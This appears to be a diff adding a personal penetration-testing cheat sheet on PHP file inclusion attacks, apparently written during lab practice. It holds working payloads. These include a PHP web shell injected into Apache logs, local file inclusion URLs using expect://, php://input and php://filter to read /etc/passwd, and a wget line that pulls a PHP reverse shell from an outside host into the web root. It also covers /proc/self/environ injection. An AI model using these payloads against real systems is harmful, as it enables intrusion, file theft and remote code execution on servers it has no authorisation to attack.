@@ -1,0 +1,30 @@
+REMOTE FILE INCLUSION
+/opt/metasploit-framework/embedded/framework/data/exploits/php/rfi-locations.dat
+
+curl 127.0.0.1 80
+	POST <?php echo shell_exec($_GET['cmd']);?>
+	http://10.11.1.35/addguestbook.php?name=a&comment=b&cmd=EXPLOIT&LANG=../../../../../
+../../xampp/apache/logs/access.log%00
+	-infect local filesystem with executable php in apache logs with POST request
+	-load the introduced malicious code by appending it and an unflitered PHP include function
+
+EX	
+http://127.0.0.1/fileincl/example1.php?page=expect://ls
+http://192.168.183.128/fileincl/example1.php?page=php://input
+http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+
+
+PAYLOADS
+<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>
+/proc/self/environ
+	-if /proc/self/environ can be included, then a user agent string can be executed by the remote machine
+/proc/self/fd/
+	-if injectable, then refer can be executed by the remote machine
+
+
+tools
+fimap
+burp
+curl
+
+	
